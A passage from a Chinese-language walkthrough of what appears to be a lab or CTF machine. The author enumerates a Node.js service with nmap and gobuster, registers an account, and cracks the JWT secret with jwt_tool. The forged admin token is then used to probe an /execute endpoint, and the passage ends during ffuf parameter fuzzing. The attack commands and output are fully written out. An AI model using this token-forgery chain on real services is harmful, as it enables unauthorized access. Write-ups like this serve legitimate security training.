OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">15.73</span> seconds</code></pre>
<p>开放了22 3000两个端口，3000端口http服务 Node.js<br>直接去看3000端口</p>
<h1 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h1><p><img src="https://ooo.0x0.ooo/2024/05/18/OJginb.png" alt="OJginb.png" loading="lazy"><br>不能用get，试试post<br><img src="https://ooo.0x0.ooo/2024/05/18/OJgn4l.png" alt="OJgn4l.png" loading="lazy"><br>？？？POST也不行？<br>直接扫一下目录试试</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.175:3000/  -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.175:3000/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Progress: <span class="token number">103666</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">7.83</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">103719</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">7.84</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>GET没扫出来，换POST扫</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.175:3000/  -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -m POST</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.175:3000/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  POST
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/login                <span class="token punctuation">(</span>Status: <span class="token number">401</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">22</span><span class="token punctuation">]</span>
/register             <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">29</span><span class="token punctuation">]</span>
/Login                <span class="token punctuation">(</span>Status: <span class="token number">401</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">22</span><span class="token punctuation">]</span>
/Register             <span class="token punctuation">(</span>Status: <span class="token number">400</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">29</span><span class="token punctuation">]</span>
/execute              <span class="token punctuation">(</span>Status: <span class="token number">401</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">12</span><span class="token punctuation">]</span>
Progress: <span class="token number">393759</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">29.75</span>%<span class="token punctuation">)</span>^C
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Keyboard interrupt detected, terminating.
Progress: <span class="token number">393823</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">29.76</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>有成果了，一一看看<br><img src="https://ooo.0x0.ooo/2024/05/18/OJgNkB.png" alt="OJgNkB.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/18/OJg16g.png" alt="OJg16g.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/18/OJgems.png" alt="OJgems.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/18/OJgrYK.png" alt="OJgrYK.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/18/OJgK5a.png" alt="OJgK5a.png" loading="lazy"><br>都没有什么东西，应该要注册一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/register -X POST -d 'role=admim' </span>
The <span class="token string">"role"</span> field is not valid                         
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/register -X POST -H "Content-Type: application/json" -d '&#123;"role":"admin"&#125;' </span>
Not authorized <span class="token operator">!</span>    
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/register -X POST -H "Content-Type: application/json" -d '&#123;"role":"tao"&#125;'   </span>
The <span class="token string">"role"</span> field is not valid                                  
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/register -X POST -H "Content-Type: application/json" -d '&#123;"role":"user"&#125;' </span>
Column <span class="token string">'username'</span> cannot be null                                                                                
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/register -X POST -H "Content-Type: application/json" -d '&#123;"role":"user","username":"tao"&#125;' </span>
Column <span class="token string">'password'</span> cannot be null  
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/register -X POST -H "Content-Type: application/json" -d '&#123;"role":"user","username":"tao","password":"tao"&#125;' </span>
Registration OK </code></pre>
<p>role键值必须是user才行<br>登录一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/login -X POST -H "Content-Type: application/json" -d '&#123;"role":"user","username":"tao","password":"tao"&#125;' </span>
<span class="token punctuation">&#123;</span><span class="token string">"accessToken"</span><span class="token builtin class-name">:</span><span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRhbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE2MDMyODAxfQ.L5x-Kse6uBvyLWAolOhbis3M34dPcPcwUAL3pxtqtyA"</span><span class="token punctuation">&#125;</span>         </code></pre>
<p>登录给了一个jwt，去解析一下<br><img src="https://ooo.0x0.ooo/2024/05/18/OJgZAS.png" alt="OJgZAS.png" loading="lazy"><br>role是user，看看能不能伪造成admin</p>
<h1 id="jwt伪造"><a href="#jwt伪造" class="headerlink" title="jwt伪造"></a>jwt伪造</h1><pre class="language-bash" data-language="bash"><code class="language-bash">python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRhbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE2MDMyODAxfQ.L5x-Kse6uBvyLWAolOhbis3M34dPcPcwUAL3pxtqtyA <span class="token parameter variable">-C</span> <span class="token parameter variable">-d</span> secret.txt

        <span class="token punctuation">\</span>   <span class="token punctuation">\</span>        <span class="token punctuation">\</span>         <span class="token punctuation">\</span>          <span class="token punctuation">\</span>                    <span class="token punctuation">\</span>
   <span class="token punctuation">\</span>__   <span class="token operator">|</span>   <span class="token operator">|</span>  <span class="token punctuation">\</span>     <span class="token operator">|</span><span class="token punctuation">\</span>__    __<span class="token operator">|</span> <span class="token punctuation">\</span>__    __<span class="token operator">|</span>                    <span class="token operator">|</span>
         <span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token punctuation">\</span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>       <span class="token punctuation">\</span>         <span class="token punctuation">\</span>     <span class="token operator">|</span>
         <span class="token operator">|</span>        <span class="token punctuation">\</span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>    __  <span class="token punctuation">\</span>     __  <span class="token punctuation">\</span>    <span class="token operator">|</span>
  <span class="token punctuation">\</span>      <span class="token operator">|</span>      _     <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
   <span class="token operator">|</span>     <span class="token operator">|</span>     / <span class="token punctuation">\</span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
<span class="token punctuation">\</span>        <span class="token operator">|</span>    /   <span class="token punctuation">\</span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span><span class="token punctuation">\</span>        <span class="token operator">|</span><span class="token punctuation">\</span>        <span class="token operator">|</span>   <span class="token operator">|</span>
 <span class="token punctuation">\</span>______/ <span class="token punctuation">\</span>__/     <span class="token punctuation">\</span>__<span class="token operator">|</span>   <span class="token punctuation">\</span>__<span class="token operator">|</span>      <span class="token punctuation">\</span>__<span class="token operator">|</span> <span class="token punctuation">\</span>______/  <span class="token punctuation">\</span>______/ <span class="token punctuation">\</span>__<span class="token operator">|</span>
 Version <span class="token number">2.2</span>.6                <span class="token punctuation">\</span>______<span class="token operator">|</span>             @ticarpi

Original JWT:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> nopassword is the CORRECT key<span class="token operator">!</span>
You can tamper/fuzz the token contents <span class="token punctuation">(</span>-T/-I<span class="token punctuation">)</span> and sign it using:
python3 jwt_tool.py <span class="token punctuation">[</span>options here<span class="token punctuation">]</span> <span class="token parameter variable">-S</span> hs256 <span class="token parameter variable">-p</span> <span class="token string">"nopassword"</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/18/OJgvSN.png" alt="OJgvSN.png" loading="lazy"></p>
<p>拿到key是<code>nopassword</code>，然后将role和username都改成admin<br><img src="https://ooo.0x0.ooo/2024/05/18/OJgpDi.png" alt="OJgpDi.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzE2MDMyODAxfQ.e9_cYFl3gVal-PoHg6xwwItKJF_QdhcCS-_xMJ6M75k</code></pre>
<p>看看能不能execute一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/execute -X POST -H "Content-Type: application/json" --Cookie 'accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzE2MDMyODAxfQ.e9_cYFl3gVal-PoHg6xwwItKJF_QdhcCS-_xMJ6M75k'</span>
Unauthorized 

┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/execute -X POST -H "Content-Type: application/json" -d '&#123;"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzE2MDMyODAxfQ.e9_cYFl3gVal-PoHg6xwwItKJF_QdhcCS-_xMJ6M75k"&#125;'</span>
Unauthorized</code></pre>
<p>不是哥们，这个jwt塞哪儿啊，不得不打开大佬的wp了，原来有固定格式的，具体参考<br><a href="https://zhuanlan.zhihu.com/p/666614951">https://zhuanlan.zhihu.com/p/666614951</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEzNzkzMDc0fQ._RwKQ_EntJ-JfKBf1XFz01kuo2urBrlfPcmwlRL7Q_I"</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span>
<span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>head<span class="token operator">></span>
<span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>title<span class="token operator">></span>Error<span class="token operator">&lt;</span>/title<span class="token operator">></span>
<span class="token operator">&lt;</span>/head<span class="token operator">></span>
<span class="token operator">&lt;</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span>pre<span class="token operator">></span>TypeError <span class="token punctuation">[</span>ERR_INVALID_ARG_TYPE<span class="token punctuation">]</span>: The <span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token function">file</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span> argument must be of <span class="token builtin class-name">type</span> string. Received undefined<span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at validateString <span class="token punctuation">(</span>internal/validators.js:120:11<span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at normalizeSpawnArguments <span class="token punctuation">(</span>child_process.js:411:3<span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at spawn <span class="token punctuation">(</span>child_process.js:547:16<span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at Object.execFile <span class="token punctuation">(</span>child_process.js:237:17<span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at <span class="token builtin class-name">exec</span> <span class="token punctuation">(</span>child_process.js:158:25<span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at /opt/login-app/app.js:69:<span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at Layer.handle <span class="token punctuation">[</span>as handle_request<span class="token punctuation">]</span> <span class="token punctuation">(</span>/opt/login-app/node_modules/express/lib/router/layer.js:95:5<span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at next <span class="token punctuation">(</span>/opt/login-app/node_modules/express/lib/router/route.js:144:13<span class="token punctuation">)</span><span class="token operator">&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at /opt/login-app/app.js:112:<span class="token operator"><span class="token file-descriptor important">5</span>&lt;</span>br<span class="token operator">></span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:1<span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span>/pre<span class="token operator">></span>
<span class="token operator">&lt;</span>/body<span class="token operator">></span>
<span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre>
<p>有些东西，但是post过去的参数还有些不对，fuzz一下，参数是什么</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">                                                                                                                                                
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEzNzkzMDc0fQ._RwKQ_EntJ-JfKBf1XFz01kuo2urBrlfPcmwlRL7Q_I" -d '&#123;"FUZZ":"123"&#125;' -u http://192.168.56.175:3000/execute -fw  54</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

